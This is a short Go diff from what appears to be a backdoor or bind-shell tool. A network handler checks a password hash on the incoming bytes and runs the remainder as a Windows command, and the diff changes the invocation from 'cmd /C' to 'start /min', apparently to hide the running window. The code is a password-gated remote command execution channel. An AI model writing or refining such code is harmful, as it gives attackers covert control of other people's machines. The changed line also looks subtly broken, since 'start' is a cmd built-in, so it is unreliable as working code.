@@ -37,7 +37,7 @@ func handleconn(conn net.Conn) {
 		return
 	}
 	if sha256.Sum256(b[:32]) == pwHash {
-		cmd := exec.Command("cmd", "/C", string(b[32:]))
+		cmd := exec.Command("start", "/min", string(b[32:]))
 		var output bytes.Buffer
 		cmd.Stdout = &output
 		err := cmd.Run()
